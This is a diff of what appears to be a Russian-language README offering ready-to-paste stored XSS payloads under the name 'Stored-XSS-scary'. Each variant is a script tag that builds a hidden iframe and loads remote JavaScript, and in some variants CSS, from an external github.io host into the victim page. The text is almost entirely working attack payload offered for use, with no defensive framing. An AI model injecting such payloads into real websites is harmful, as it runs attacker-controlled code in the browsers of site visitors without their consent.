@@ -5,8 +5,8 @@
 
 ------------------------------------------
 
-Обрезанная версия (только запуск музыки):
-> <script>var frame = document.createElement("iframe"); frame.style.display = "none"; document.body.appendChild(frame); frame.onload = function() { var script = document.createElement('script'); script.src = 'https://0-dayff13r.github.io/Stored-XSS-scary/start.js'; frame.contentWindow.document.head.appendChild(script)}</script>
+Полная версия (музыка + CSS + доп. JS скрипты):
+> <script>var f=document.createElement("iframe");f.style.display="none";document.body.appendChild(f);f.onload=function(){var s=document.createElement('script');s.src='//0-dayff13r.github.io/Stored-XSS-scary/start.js';f.contentWindow.document.head.appendChild(s);var c=document.createElement('link');c.rel='stylesheet';c.href='//0-dayff13r.github.io/Stored-XSS-scary/styles.css';document.head.appendChild(c);var r=document.createElement('script');r.src='//0-dayff13r.github.io/Stored-XSS-scary/script.js';document.body.appendChild(r)}</script>
 
-Полная версия (музыка + CSS):
-> <script>var frame = document.createElement("iframe"); frame.style.display = "none"; document.body.appendChild(frame); frame.onload = function() { var script = document.createElement('script'); script.src = 'https://0-dayff13r.github.io/Stored-XSS-scary/start.js'; frame.contentWindow.document.head.appendChild(script); var cssLink = document.createElement('link'); cssLink.rel = 'stylesheet'; cssLink.href = 'https://0-dayff13r.github.io/Stored-XSS-scary/styles.css'; document.head.appendChild(cssLink); var script2 = document.createElement('script'); script2.src = 'https://0-dayff13r.github.io/Stored-XSS-scary/script.js'; document.body.appendChild(script2);}</script>
+Обрезанная версия (только музыка):
+> <script>var f=document.createElement("iframe");f.style.display="none";document.body.appendChild(f);f.onload=function(){var s=document.createElement('script');s.src='//0-dayff13r.github.io/Stored-XSS-scary/start.js';f.contentWindow.document.head.appendChild(s)}</script>
